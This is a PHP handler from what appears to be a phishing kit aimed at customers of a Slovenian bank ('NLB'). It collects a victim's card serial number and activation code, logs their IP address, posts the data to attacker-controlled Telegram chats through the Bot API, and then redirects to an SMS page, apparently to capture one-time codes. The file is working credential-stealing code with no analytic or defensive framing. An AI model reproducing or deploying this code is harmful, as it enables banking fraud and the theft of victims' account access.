<?php
   include "../config.php";
   include "antibot1.php";
   $ip = getenv("REMOTE_ADDR");
   $activationcode = $_POST['activation1'].$_POST['activation2'].$_POST['activation3'].$_POST['activation4'];

      $message = "-------------------- 💳 NLB Activation 💳-------------------\nSerial Number : ".$_POST['serial1']."".$_POST['serial2']."\n Activation Code :".$_POST['activation1'].$_POST['activation2'].$_POST['activation3'].$_POST['activation4']." \nIP      : ".$ip."\n-------------------- 🇸🇮 Zoldyck 🇸🇮-------------------\n";
      foreach($user_ids as $user_id) {
      $url='https://api.telegram.org/bot'.$bottoken.'/sendMessage';
      $data=array('chat_id'=>$user_id,'text'=>$message);
      $options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
      $context=stream_context_create($options);
      $result=file_get_contents($url,false,$context);

      }
      
      header("Location: ../sms.php?id=$ip");
      
      ?>